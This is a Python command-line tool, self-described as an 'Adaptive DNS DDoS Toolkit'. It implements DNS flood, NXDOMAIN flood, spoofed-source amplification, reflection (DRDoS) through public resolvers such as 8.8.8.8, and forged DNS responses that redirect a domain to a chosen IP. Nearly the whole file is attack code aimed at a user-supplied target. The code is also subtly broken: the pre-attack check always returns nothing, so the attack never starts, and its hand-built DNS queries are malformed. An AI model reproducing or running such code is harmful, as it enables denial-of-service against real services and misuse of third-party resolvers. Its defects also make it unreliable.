import random
import time
import socket
import threading
import argparse
import sys
import logging
from collections import deque
import numpy as np
try:
    from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, RandString
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
from termcolor import colored

logging.basicConfig(filename='dns_ddos.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

stats = {"packets_sent": 0, "errors": 0, "hijacks": 0}
stats_lock = threading.Lock()

dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]

class SmartMonitor:
    def __init__(self, target_ip, duration=60):
        self.target_ip = target_ip
        self.duration = duration
        self.latency_data = deque(maxlen=100)
        self.packet_loss_count = 0
        self.packet_loss_threshold = 0.1
        self.latency_threshold = 500
        self.target_is_vulnerable = False

    def analyze_target(self):
        print(colored(f"Analyzing target {self.target_ip}...", "cyan"))
        for _ in range(self.duration):
            start_time = time.time()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                query = (
                    b'\x00\x01' + b'\x01\x00' + b'\x00\x01' + b'\x00\x00' + b'\x00\x00' + b'\x00\x00' +
                    b'\x07example\x03com\x00' + b'\x00\x01' + b'\x00\x01'
                )
                sock.sendto(query, (self.target_ip, 53))
                sock.recv(1024)
                latency = (time.time() - start_time) * 1000
                self.latency_data.append(latency)
                print(colored(f"Latency: {latency:.2f} ms", "green"))
            except (socket.timeout, socket.error):
                self.packet_loss_count += 1
                self.latency_data.append(1000)
                print(colored(f"Timeout/packet loss to {self.target_ip}", "red"))
            finally:
                sock.close()
            self.check_vulnerabilities()
            time.sleep(1)

    def check_vulnerabilities(self):
        if not self.latency_data:
            return
        avg_latency = np.mean(self.latency_data)
        packet_loss_rate = self.packet_loss_count / (len(self.latency_data) + self.packet_loss_count)
        if avg_latency > self.latency_threshold or packet_loss_rate > self.packet_loss_threshold:
            self.target_is_vulnerable = True
            print(colored(f"Vulnerability detected: Average latency {avg_latency:.2f} ms, Packet loss {packet_loss_rate:.2%}", "yellow"))
        else:
            self.target_is_vulnerable = False

class AdaptiveDDoSAttack:
    def __init__(self, target_ip, target_port=53, duration=60, threads=10, attack_type="dns_flood", spoofing=True, dns_server="8.8.8.8", fake_ip="192.168.1.100"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.attack_type = attack_type
        self.spoofing = spoofing and SCAPY_AVAILABLE
        self.dns_server = dns_server
        self.fake_ip = fake_ip
        self.monitor = SmartMonitor(target_ip, duration)

    def start_attack(self):
        if not self.monitor.analyze_target():
            print(colored("Target not vulnerable. Attack not started.", "red"))
            return
        print(colored(f"Starting {self.attack_type.upper()} attack on {self.target_ip}:{self.target_port}...", "green"))
        thread_list = []
        for _ in range(self.threads):
            thread = threading.Thread(target=self.launch_attack)
            thread_list.append(thread)
            thread.start()
        start_time = time.time()
        while time.time() < start_time + self.duration:
            time.sleep(1)
            with stats_lock:
                print(colored(f"\r[STATS] Packets: {stats['packets_sent']} | Errors: {stats['errors']} | Hijacks: {stats['hijacks']}", "yellow"), end="")
        print()
        for thread in thread_list:
            thread.join()
        print(colored(f"\nAttack completed. Stats:", "green"))
        print(colored(f"Packets sent: {stats['packets_sent']}", "cyan"))
        print(colored(f"Errors: {stats['errors']}", "red"))
        print(colored(f"Hijacks: {stats['hijacks']}", "magenta"))

    def launch_attack(self):
        end_time = time.time() + self.duration
        while time.time() < end_time:
            try:
                if self.attack_type == "dns_amplification" and self.spoofing:
                    self.dns_amplification()
                elif self.attack_type == "dns_flood":
                    self.dns_flood()
                elif self.attack_type == "nxdomain":
                    self.nxdomain_attack()
                elif self.attack_type == "dns_hijacking" and self.spoofing:
                    self.dns_hijacking()
                elif self.attack_type == "drdos" and self.spoofing:
                    self.drdos()
                time.sleep(0.01)
            except Exception as e:
                with stats_lock:
                    stats["errors"] += 1
                logging.error(f"Attack error {self.attack_type}: {e}")

    def dns_amplification(self):
        if not SCAPY_AVAILABLE:
            raise Exception("Scapy not available for amplification")
        packet = IP(dst=self.dns_server, src=self.target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
        send(packet, verbose=0)
        with stats_lock:
            stats["packets_sent"] += 1
        logging.info(f"Amplification packet to {self.dns_server}")

    def dns_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        domain = f"{''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(10))}.example.com"
        query = (
            b'\x00\x01' + b'\x01\x00' + b'\x00\x01' + b'\x00\x00' + b'\x00\x00' + b'\x00\x00' +
            bytes([len(part) for part in domain.split('.')]) + domain.encode() + b'\x00' + b'\x00\x01' + b'\x00\x01'
        )
        sock.sendto(query, (self.target_ip, self.target_port))
        sock.close()
        with stats_lock:
            stats["packets_sent"] += 1
        logging.info(f"Flood packet for {domain}")

    def nxdomain_attack(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        domain = f"nonexistent-{''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(12))}.example.com"
        query = (
            b'\x00\x01' + b'\x01\x00' + b'\x00\x01' + b'\x00\x00' + b'\x00\x00' + b'\x00\x00' +
            bytes([len(part) for part in domain.split('.')]) + domain.encode() + b'\x00' + b'\x00\x01' + b'\x00\x01'
        )
        sock.sendto(query, (self.target_ip, self.target_port))
        sock.close()
        with stats_lock:
            stats["packets_sent"] += 1
        logging.info(f"NXDOMAIN packet for {domain}")

    def dns_hijacking(self):
        if not SCAPY_AVAILABLE:
            raise Exception("Scapy not available for hijacking")
        packet = (
            IP(dst=self.target_ip) / UDP(sport=53, dport=self.target_port) /
            DNS(id=random.randint(1, 65535), qr=1, aa=1, 
                qd=DNSQR(qname="tuosito1.com"), 
                an=DNSRR(rrname="tuosito1.com", type="A", ttl=300, rdata=self.fake_ip))
        )
        send(packet, verbose=0)
        with stats_lock:
            stats["packets_sent"] += 1
            stats["hijacks"] += 1
        logging.info(f"Hijack packet to {self.fake_ip}")

    def drdos(self):
        if not SCAPY_AVAILABLE:
            raise Exception("Scapy not available for DRDoS")
        dns_server = random.choice(dns_servers)
        packet = IP(dst=dns_server, src=self.target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com", qtype="TXT"))
        send(packet, verbose=0)
        with stats_lock:
            stats["packets_sent"] += 1
        logging.info(f"DRDoS packet to {dns_server}")

def main():
    parser = argparse.ArgumentParser(description="Adaptive DNS DDoS Toolkit")
    parser.add_argument("attack_type", choices=["dns_amplification", "dns_flood", "nxdomain", "dns_hijacking", "drdos"])
    parser.add_argument("target_ip")
    parser.add_argument("--target-port", type=int, default=53)
    parser.add_argument("--duration", type=int, default=60)
    parser.add_argument("--threads", type=int, default=10)
    parser.add_argument("--dns-server", default="8.8.8.8")
    parser.add_argument("--fake-ip", default="192.168.1.100")
    parser.add_argument("--no-spoofing", action="store_true", help="Disable spoofing for Android")
    args = parser.parse_args()

    if not validate_ip(args.target_ip) or (args.attack_type in ["dns_amplification", "drdos"] and not validate_ip(args.dns_server)):
        print(colored("Error: Invalid IP address.", "red"))
        sys.exit(1)
    if not 1 <= args.target_port <= 65535:
        print(colored("Error: Invalid port.", "red"))
        sys.exit(1)

    attack = AdaptiveDDoSAttack(
        args.target_ip, args.target_port, args.duration, args.threads, 
        args.attack_type, not args.no_spoofing, args.dns_server, args.fake_ip
    )
    attack.start_attack()

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\nInterrupted.", "yellow"))
        sys.exit(0)
